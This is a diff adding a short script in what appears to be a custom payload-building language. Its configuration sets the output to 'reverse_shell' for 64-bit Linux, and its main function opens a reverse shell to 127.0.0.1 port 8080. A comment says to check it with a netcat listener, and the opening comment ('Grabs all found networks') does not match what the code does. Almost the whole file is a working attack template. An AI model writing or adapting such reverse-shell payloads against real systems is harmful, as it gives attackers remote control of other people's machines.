@@ -1,0 +1,22 @@
+@ Grabs all found networks @
+
+@ To check if the reverse shell works, run the following nc -l 8080 @
+
+use system
+use network
+
+[
+    version 2.0
+    output reverse_shell
+    os linux
+    arch amd64
+    obfuscate false
+    debugger_behavior stop
+]
+
+
+l main_func {
+    network::reverse_shell(${"127.0.0.1", "8080"}$)
+
+    system::exit("0")
+}
